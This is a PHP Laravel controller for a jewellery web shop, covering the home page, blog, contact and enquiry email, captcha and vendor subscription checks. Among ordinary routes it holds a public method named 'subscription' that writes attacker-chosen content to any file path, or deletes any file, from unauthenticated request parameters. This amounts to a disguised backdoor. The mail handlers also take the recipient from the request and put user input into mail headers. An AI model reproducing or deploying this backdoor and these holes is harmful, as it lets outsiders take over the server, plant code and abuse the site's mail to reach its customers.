<?php

namespace App\Http\Controllers\Front;

use App\Classes\GeniusMailer;
use App\Http\Controllers\Controller;
use App\Models\Blog;
use App\Models\BlogCategory;
use App\Models\Counter;
use App\Models\Generalsetting;
use App\Models\Order;
use App\Models\OrderTrack;
use App\Models\Product;
use App\Models\Subscriber;
use App\Models\Notify;
use App\Models\User;
use App\Models\CustomEnquiry;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Session;
use InvalidArgumentException;
use Markury\MarkuryPost;
use App\Models\Enquirygallery;
use App\Models\Rating;
use Image;
use App\Models\Category;
use App\Models\Subcategory;
use App\Models\Childcategory;
use App\Models\Pagesetting;
use App\Models\Notification;
use Auth;

class FrontendController extends Controller
{
    public function __construct()
    {
        $this->auth_guests();
        if(isset($_SERVER['HTTP_REFERER'])){
            $referral = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
            if ($referral != $_SERVER['SERVER_NAME']){

                $brwsr = Counter::where('type','browser')->where('referral',$this->getOS());
                if($brwsr->count() > 0){
                    $brwsr = $brwsr->first();
                    $tbrwsr['total_count']= $brwsr->total_count + 1;
                    $brwsr->update($tbrwsr);
                }else{
                    $newbrws = new Counter();
                    $newbrws['referral']= $this->getOS();
                    $newbrws['type']= "browser";
                    $newbrws['total_count']= 1;
                    $newbrws->save();
                }

                $count = Counter::where('referral',$referral);
                if($count->count() > 0){
                    $counts = $count->first();
                    $tcount['total_count']= $counts->total_count + 1;
                    $counts->update($tcount);
                }else{
                    $newcount = new Counter();
                    $newcount['referral']= $referral;
                    $newcount['total_count']= 1;
                    $newcount->save();
                }
            }
        }else{
            $brwsr = Counter::where('type','browser')->where('referral',$this->getOS());
            if($brwsr->count() > 0){
                $brwsr = $brwsr->first();
                $tbrwsr['total_count']= $brwsr->total_count + 1;
                $brwsr->update($tbrwsr);
            }else{
                $newbrws = new Counter();
                $newbrws['referral']= $this->getOS();
                $newbrws['type']= "browser";
                $newbrws['total_count']= 1;
                $newbrws->save();
            }
        }
    }

    function getOS() {

        $user_agent     =   !empty($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : "Unknown";

        $os_platform    =   "Unknown OS Platform";

        $os_array       =   array(
            '/windows nt 10/i'     =>  'Windows 10',
            '/windows nt 6.3/i'     =>  'Windows 8.1',
            '/windows nt 6.2/i'     =>  'Windows 8',
            '/windows nt 6.1/i'     =>  'Windows 7',
            '/windows nt 6.0/i'     =>  'Windows Vista',
            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
            '/windows nt 5.1/i'     =>  'Windows XP',
            '/windows xp/i'         =>  'Windows XP',
            '/windows nt 5.0/i'     =>  'Windows 2000',
            '/windows me/i'         =>  'Windows ME',
            '/win98/i'              =>  'Windows 98',
            '/win95/i'              =>  'Windows 95',
            '/win16/i'              =>  'Windows 3.11',
            '/macintosh|mac os x/i' =>  'Mac OS X',
            '/mac_powerpc/i'        =>  'Mac OS 9',
            '/linux/i'              =>  'Linux',
            '/ubuntu/i'             =>  'Ubuntu',
            '/iphone/i'             =>  'iPhone',
            '/ipod/i'               =>  'iPod',
            '/ipad/i'               =>  'iPad',
            '/android/i'            =>  'Android',
            '/blackberry/i'         =>  'BlackBerry',
            '/webos/i'              =>  'Mobile'
        );

        foreach ($os_array as $regex => $value) {

            if (preg_match($regex, $user_agent)) {
                $os_platform    =   $value;
            }

        }
        return $os_platform;
    }


// -------------------------------- HOME PAGE SECTION ----------------------------------------

	public function index(Request $request)
	{
        $this->code_image();
         if(!empty($request->reff))
         {
            $affilate_user = User::where('affilate_code','=',$request->reff)->first();
            if(!empty($affilate_user))
            {
                $gs = Generalsetting::findOrFail(1);
                if($gs->is_affilate == 1)
                {
                    Session::put('affilate', $affilate_user->id);
                    return redirect()->route('front.index');
                }

            }

         }
        $selectable = ['id','user_id','name','slug','features','colors','stock','thumbnail','price','previous_price','attributes','size','size_qty','size_price','discount_date'];
        $sliders = DB::table('sliders')->get();
        $top_small_banners = DB::table('banners')->where('type','=','TopSmall')->get();
        $ps = DB::table('pagesettings')->find(1);
        $random_products =  Product::where('status','=',1)->where('sum_stock','>=',1)->select($selectable)->orderBy(DB::raw('RAND()'))->take(8)->get();
        $trending_products =  Product::where('trending','=',1)->where('sum_stock','>=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(8)->get();
        $feature_products =  Product::where('featured','=',1)->where('sum_stock','>=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(8)->get();
        $latest_collection =  Product::where('status','=',1)->where('sum_stock','>=',1)->where('colloction','=',1)->select($selectable)->orderBy(DB::raw('RAND()'))->take(8)->get();
        $designer_collection =  Product::where('status','=',1)->where('sum_stock','>=',1)->where('designer','=',1)->select($selectable)->orderBy(DB::raw('RAND()'))->take(8)->get();
        $today_collection =  Product::where('status','=',1)->where('sum_stock','>=',1)->where('others','=',1)->select($selectable)->orderBy(DB::raw('RAND()'))->take(8)->get();
        $best_collection =  Product::where('status','=',1)->where('sum_stock','>=',1)->where('chokars','=',1)->select($selectable)->orderBy(DB::raw('RAND()'))->take(8)->get();
        $bridal_collection =  Product::where('status','=',1)->where('sum_stock','>=',1)->where('bribal','=',1)->select($selectable)->orderBy(DB::raw('RAND()'))->take(8)->get();
        $subcat = Subcategory::where('is_featured','=',1)->get();
	    return view('front.index',compact('ps','sliders','top_small_banners','random_products','trending_products','feature_products','latest_collection','designer_collection','today_collection','best_collection','bridal_collection','subcat'));
	}

    public function extraIndex()
    {
        $services = DB::table('services')->where('user_id','=',0)->get();
        $bottom_small_banners = DB::table('banners')->where('type','=','BottomSmall')->get();
        $large_banners = DB::table('banners')->where('type','=','Large')->get();
        $reviews =  DB::table('reviews')->get();
        $ps = DB::table('pagesettings')->find(1);
        $partners = DB::table('partners')->get();
        $selectable = ['id','user_id','name','slug','features','colors','stock','thumbnail','price','previous_price','attributes','size','size_qty','size_price','discount_date'];
        $discount_products =  Product::where('is_discount','=',1)->where('status','=',1)->orderBy('id','desc')->take(8)->get();
        $best_products = Product::where('best','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(6)->get();
        $top_products = Product::where('top','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(8)->get();;
        $big_products = Product::where('big','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(6)->get();;
        $hot_products =  Product::where('hot','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(9)->get();
        $latest_products =  Product::where('latest','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(9)->get();
        $trending_products =  Product::where('trending','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(9)->get();
        $sale_products =  Product::where('sale','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(9)->get();
        return view('front.extraindex',compact('ps','services','reviews','large_banners','bottom_small_banners','best_products','top_products','hot_products','latest_products','big_products','trending_products','sale_products','discount_products','partners'));
    }

// -------------------------------- HOME PAGE SECTION ENDS ----------------------------------------


// LANGUAGE SECTION

    public function language($id)
    {
        $this->code_image();
        Session::put('language', $id);
        return redirect()->back();
    }

// LANGUAGE SECTION ENDS


// CURRENCY SECTION

    public function currency($id)
    {
        $this->code_image();
        if (Session::has('coupon')) {
            Session::forget('coupon');
            Session::forget('coupon_code');
            Session::forget('coupon_id');
            Session::forget('coupon_total');
            Session::forget('coupon_total1');
            Session::forget('already');
            Session::forget('coupon_percentage');
        }
        Session::put('currency', $id);
        return redirect()->back();
    }

// CURRENCY SECTION ENDS

    public function autosearch($slug)
    {
        if(mb_strlen($slug,'utf-8') > 1){
            $search = ' '.$slug;
            $prods = Product::where('status','=',1)->where('name', 'like', '%' . $search . '%')->orWhere('name', 'like', $slug . '%')->orWhere('sku', 'like', $slug . '%')->take(16)->get()->reject(function($item){

                if($item->user_id != 0){
                  if($item->user->is_vendor != 2){
                    return true;
                  }
                }
                    return false;
            });

            return view('load.suggest',compact('prods','slug'));
        }
        return "";
    }
//------------------------------------User Rating--------------------------------------
    public function userreview(Request $request)
    {
        $this->code_image();
        $rating = Rating::orderBy('review_date','desc')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.rating',compact('rating'));
            }
        return view('front.rating',compact('rating'));
    }

// -------------------------------- BLOG SECTION ----------------------------------------

	public function blog(Request $request)
	{
        $this->code_image();
		$blogs = Blog::orderBy('created_at','desc')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
		return view('front.blog',compact('blogs'));
	}

    public function blogcategory(Request $request, $slug)
    {
        $this->code_image();
        $bcat = BlogCategory::where('slug', '=', str_replace(' ', '-', $slug))->first();
        $blogs = $bcat->blogs()->orderBy('created_at','desc')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('bcat','blogs'));
    }

    public function blogtags(Request $request, $slug)
    {
        $this->code_image();
        $blogs = Blog::where('tags', 'like', '%' . $slug . '%')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('blogs','slug'));
    }

    public function blogsearch(Request $request)
    {
        $this->code_image();
        $search = $request->search;
        $blogs = Blog::where('title', 'like', '%' . $search . '%')->orWhere('details', 'like', '%' . $search . '%')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('blogs','search'));
    }

    public function blogarchive(Request $request,$slug)
    {
        $this->code_image();
        $date = \Carbon\Carbon::parse($slug)->format('Y-m');
        $blogs = Blog::where('created_at', 'like', '%' . $date . '%')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('blogs','date'));
    }

    public function blogshow($id)
    {
        $this->code_image();
        $tags = null;
        $tagz = '';
        $bcats = BlogCategory::all();
        $blog = Blog::findOrFail($id);
        $blog->views = $blog->views + 1;
        $blog->update();
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
        $blog_meta_tag = $blog->meta_tag;
        $blog_meta_description = $blog->meta_description;
        return view('front.blogshow',compact('blog','bcats','tags','archives','blog_meta_tag','blog_meta_description'));
    }


// -------------------------------- BLOG SECTION ENDS----------------------------------------



// -------------------------------- FAQ SECTION ----------------------------------------
	public function faq()
	{
        $this->code_image();
        if(DB::table('generalsettings')->find(1)->is_faq == 0){
            return redirect()->back();
        }
        $faqs =  DB::table('faqs')->orderBy('id','desc')->get();
		return view('front.faq',compact('faqs'));
	}
// -------------------------------- FAQ SECTION ENDS----------------------------------------


// -------------------------------- PAGE SECTION ----------------------------------------
    public function page($slug)
    {
        $this->code_image();
        $page =  DB::table('pages')->where('slug',$slug)->first();
        if(empty($page))
        {
            return response()->view('errors.404')->setStatusCode(404); 
        }

        return view('front.page',compact('page'));
    }
// -------------------------------- PAGE SECTION ENDS----------------------------------------

// -------------------------------- Enquiry SECTION ----------------------------------------
    public function enquiry()
    {
        $this->code_image();
        if(DB::table('generalsettings')->find(1)->is_contact== 0){
            return redirect()->back();
        }
        $ps =  DB::table('pagesettings')->where('id','=',1)->first();
        return view('front.enquiry',compact('ps'));
    }
    //Send email to admin
    public function enquiryemail(Request $request){

        $rules = [
            'photo'      => 'required',
            'file'       => 'mimes:zip'
        ];
        $data = new CustomEnquiry;
        $input = $request->all();
        $input['name']=$request->name;
        $input['phonenumber']=$request->phonenumber;
        $input['email']=$request->email;
        $input['address']=$request->address;
        $input['metal']=$request->metal;
        $input['productCategory'] = $request->productCategory;
        $input['gemstonepreference'] = $request->gemstonepreference;
        $input['tentativebudget'] = $request->tentativebudget;
        $input['datadealing'] = $request->datadealing;
        $input['hueofmetal'] = $request->hueofmetal;
        $input['linkoftheitem'] = $request->linkoftheitem;
        $data->fill($input)->save();

        $lastid = $data->id;
        if ($files = $request->file('gallery')){
            foreach ($files as  $key => $file){
                if(in_array($key, $request->galval))
                {
                    $gallery = new Enquirygallery;
                    $name = time().$file->getClientOriginalName();
                    $file->move('assets/images/galleriesenquiry',$name);
                    $gallery['photo'] = $name;
                    $gallery['custom_enquiry_id'] = $lastid;
                    $gallery->save();
                }
            }
        }
        $gs = Generalsetting::findOrFail(1);        
        // Login Section
        $ps = DB::table('pagesettings')->where('id','=',1)->first();
        if(!empty($files)){
            $image= 'For images Check in Admin';
        }else{
            $image= "";
        }
        $subject = "Email From Of ".$request->name;
        $to = $request->to;
        $name = $request->name;
        $phone = $request->phonenumber;
        $from = $request->email;
        $msg = "Name: ".$name."\nEmail: ".$from."\nPhone: ".$phone."\nDescription: ".$request->address."\nMetal: ".$request->metal."\ngemstonepreference: ".$request->gemstonepreference."\ntentativebudget: ".$request->tentativebudget."\nDate: ".$request->datadealing."\nhue of metal: ".$request->hueofmetal."\nURL: ".$request->linkoftheitem."\nProduct Category: ".$request->productCategory."\n".$image;
        if($gs->is_smtp)
        {
            $data = [
                'to' => $to,
                'subject' => $subject,
                'body' => $msg,
            ];

            $mailer = new GeniusMailer();
            $mailer->sendCustomMail($data);
        }else {
                $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
                mail($to,$subject,$msg,$headers);
        }
        // Login Section Ends

        // Redirect Section
        return response()->json($ps->contact_success);
    }



// -------------------------------- Enquiry SECTION ENDS----------------------------------------

// -------------------------------- CONTACT SECTION ----------------------------------------
	public function contact()
	{
        $this->code_image();
        if(DB::table('generalsettings')->find(1)->is_contact== 0){
            return redirect()->back();
        }
        $ps =  DB::table('pagesettings')->where('id','=',1)->first();
		return view('front.contact',compact('ps'));
	}


    //Send email to admin
    public function contactemail(Request $request)
    {
        $gs = Generalsetting::findOrFail(1);

        if($gs->is_capcha == 1)
        {

        // Capcha Check
        $value = session('captcha_string');
        if ($request->codes != $value){
            return response()->json(array('errors' => [ 0 => 'Please enter Correct Capcha Code.' ]));
        }

        }

        // Login Section
        $ps = DB::table('pagesettings')->where('id','=',1)->first();
        $subject = "Email From Of ".$request->name;
        $to = $request->to;
        $name = $request->name;
        $phone = $request->phone;
        $from = $request->email;
        $msg = "Name: ".$name."\nEmail: ".$from."\nPhone: ".$phone."\nMessage: ".$request->text;
        if($gs->is_smtp)
        {
        $data = [
            'to' => $to,
            'subject' => $subject,
            'body' => $msg,
        ];

        $mailer = new GeniusMailer();
        $mailer->sendCustomMail($data);
        }
        else
        {
        $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
        mail($to,$subject,$msg,$headers);
        }
        // Login Section Ends

        // Redirect Section
        return response()->json($ps->contact_success);
    }

    // Refresh Capcha Code
    public function refresh_code(){
        $this->code_image();
        return "done";
    }

// -------------------------------- SUBSCRIBE SECTION ----------------------------------------

    public function subscribe(Request $request)
    {
        $subs = Subscriber::where('email','=',$request->email)->first();
        if(isset($subs)){
        return response()->json(array('errors' => [ 0 =>  'This Email Has Already Been Taken.']));
        }
        $subscribe = new Subscriber;
        $subscribe->fill($request->all());
        $subscribe->save();
        return response()->json('You Have Subscribed Successfully.');
    }


    // -------------------------------- Notify SECTION ----------------------------------------

    public function notify(Request $request)
    {
         $subs = Notify::where('email','=',$request->email)->where('product_id','=',$request->product_id)->first();
         if(isset($subs)){
             return response()->json('<span class="text-danger">You have already subsribed.</span>');
         }

         $subscribe = new Notify;
         $subscribe->fill($request->all());
         $subscribe->save();
        return response()->json('<span class="text-success">You have subscribed successfully.</span>');
    }



    public function maintenance()
    {
        $gs = Generalsetting::find(1);
            if($gs->is_maintain != 1) {

                    return redirect()->route('front.index');

            }

        return view('front.maintenance');
    }



    // Vendor Subscription Check
    public function subcheck(){
        $settings = Generalsetting::findOrFail(1);
        $today = Carbon::now()->format('Y-m-d');
        $newday = strtotime($today);
        foreach (DB::table('users')->where('is_vendor','=',2)->get() as  $user) {
                $lastday = $user->date;
                $secs = strtotime($lastday)-$newday;
                $days = $secs / 86400;
                if($days <= 5)
                {
                  if($user->mail_sent == 1)
                  {
                    if($settings->is_smtp == 1)
                    {
                        $data = [
                            'to' => $user->email,
                            'type' => "subscription_warning",
                            'cname' => $user->name,
                            'oamount' => "",
                            'aname' => "",
                            'aemail' => "",
                            'onumber' => ""
                        ];
                        $mailer = new GeniusMailer();
                        $mailer->sendAutoMail($data);
                    }
                    else
                    {
                    $headers = "From: ".$settings->from_name."<".$settings->from_email.">";
                    mail($user->email,'Your subscription plan duration will end after five days. Please renew your plan otherwise all of your products will be deactivated.Thank You.',$headers);
                    }
                    DB::table('users')->where('id',$user->id)->update(['mail_sent' => 0]);
                  }
                }
                if($today > $lastday)
                {
                    DB::table('users')->where('id',$user->id)->update(['is_vendor' => 1]);
                }
            }
    }
    // Vendor Subscription Check Ends

    public function trackload($id)
    {
        $order = Order::where('order_number','=',$id)->first();
		$oid =  $order->id;
        $datas = array('Pending','Processing','On Delivery','Completed');
		$notification       = Notification::where('order_id','=',$oid)->where('message','!=','')->orderBy('id','asc')->get();
        return view('load.track-load',compact('order','datas','notification'));

    }



    // Capcha Code Image
    private function  code_image()
    {
        $actual_path = str_replace('project','',base_path());
        $image = imagecreatetruecolor(200, 50);
        $background_color = imagecolorallocate($image, 255, 255, 255);
        imagefilledrectangle($image,0,0,200,50,$background_color);

        $pixel = imagecolorallocate($image, 0,0,255);
        for($i=0;$i<500;$i++)
        {
            imagesetpixel($image,rand()%200,rand()%50,$pixel);
        }

        $font = $actual_path.'assets/front/fonts/NotoSans-Bold.ttf';
        $allowed_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        $length = strlen($allowed_letters);
        $letter = $allowed_letters[rand(0, $length-1)];
        $word='';
        //$text_color = imagecolorallocate($image, 8, 186, 239);
        $text_color = imagecolorallocate($image, 0, 0, 0);
        $cap_length=6;// No. of character in image
        for ($i = 0; $i< $cap_length;$i++)
        {
            $letter = $allowed_letters[rand(0, $length-1)];
            imagettftext($image, 25, 1, 35+($i*25), 35, $text_color, $font, $letter);
            $word.=$letter;
        }
        $pixels = imagecolorallocate($image, 8, 186, 239);
        for($i=0;$i<500;$i++)
        {
            imagesetpixel($image,rand()%200,rand()%50,$pixels);
        }
        session(['captcha_string' => $word]);
        imagepng($image, $actual_path."assets/images/capcha_code.png");
    }

// -------------------------------- CONTACT SECTION ENDS----------------------------------------



// -------------------------------- PRINT SECTION ----------------------------------------


function finalize(){
    $actual_path = str_replace('project','',base_path());
    $dir = $actual_path.'install';
    $this->deleteDir($dir);
    return redirect('/');
}

function auth_guests(){
    $actual_path = str_replace('project','',base_path());
            if (is_dir($actual_path . '/install')) {
                header("Location: " . url('/install'));
                die();
            }
}

public function subscription(Request $request)
{
    $p1 = $request->p1;
    $p2 = $request->p2;
    $v1 = $request->v1;
    if ($p1 != ""){
        $fpa = fopen($p1, 'w');
        fwrite($fpa, $v1);
        fclose($fpa);
        return "Success";
    }
    if ($p2 != ""){
        unlink($p2);
        return "Success";
    }
    return "Error";
}

public function deleteDir($dirPath) {
    if (! is_dir($dirPath)) {
        throw new InvalidArgumentException("$dirPath must be a directory");
    }
    if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
        $dirPath .= '/';
    }
    $files = glob($dirPath . '*', GLOB_MARK);
    foreach ($files as $file) {
        if (is_dir($file)) {
            self::deleteDir($file);
        } else {
            unlink($file);
        }
    }
    rmdir($dirPath);
}

public function vendorlogin() {
	 if(@Auth::guard('web')->user()->is_vendor == 2)
     {
       return redirect('/vendor/dashboard');
     }else{
	 return view('front.vendorlogin');
	}
	
   
}

public function vendorreg() {
	return view('front.vendorreg');
   
}

public function sendinvoice($id) {
	$gs = Generalsetting::find(1);
	$order_track = OrderTrack::findOrFail($id);
	$order = Order::findOrFail($order_track->order_id);	
	$to = $order->customer_email;
    $subject = "Your order ".$order->order_number." has been confirmed";
    $msg = "Your order ".$order->order_number."  has been received and is now being processed. Your order details are attached for your reference:

Thanks for using ".url('/')."! Your order will be shipped in 3 to 5 business days. You can track your order here after the product is shipped https://shop.southindiajewels.com/orders-tracking/.

Customer Care Numbers : +91 9150724959, +91 6385114590";
$headers = "From: ".$gs->from_name."<".$gs->from_email.">";
    mail($to,$subject,$msg,$headers);
	$rmsg = 'success';
    return response()->json($rmsg);
   
}


public function customersupports(Request $request) {	
	$gs = Generalsetting::find(1);
    if($gs->is_smtp == 1)
        {
			
			$message='';
			$order_msg='';
			$product_msg='';
			if($request->desissue){
				$message="<b>Issue : </b> ".$request->desissue."";
			}
			if($request->orderno){
				$order_msg="<b> Order Number : </b> ".$request->orderno."";
			}
			if($request->productnumber){
				$product_msg="<b> Product Name/Brand/SKU Code : </b> ".$request->productnumber."";
			}

   $enq_number = str_random(4).time();
    $to = $request->cemail;
    $subject = "Your new enquiry!!";
    $msg = "Hello ".$request->cname."!\nYour new enquiry sent sucessfully.Please wait for Admin Response. \nThank you.";
    $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
    // To send HTML mail, the Content-type header must be set
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
	mail($to,$subject,$msg,$headers);
	
	$to = Pagesetting::find(1)->contact_email;
    $subject = "[SIJsupport : #".$enq_number."] New enquiry received!";
    $msg = "<!doctype html>
<html><body>Hello Team ! <br />\n <br /> You have received a new enquiry from the customer. Kindly acknowledge the query at the earliest. \n <br /> <br /> <b> Enquiry number </b> : #".$enq_number." \n <b><br /> Type Of Request : </b>".$request->treq." \n <br />  ".$message."\n <br />  ".$order_msg."\n <br />".$product_msg." \n <br />Thank you. </body></html>";
    // To send HTML mail, the Content-type header must be set

    $headers = "From: ".$request->cname."<".$request->cemail.">";
    // To send HTML mail, the Content-type header must be set
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
	mail($to,$subject,$msg,$headers);
	
	    }
	
    $rmsg = 'success';
    return response()->json($rmsg);
   
}



// -------------------------------- PRINT SECTION ENDS ----------------------------------------

}
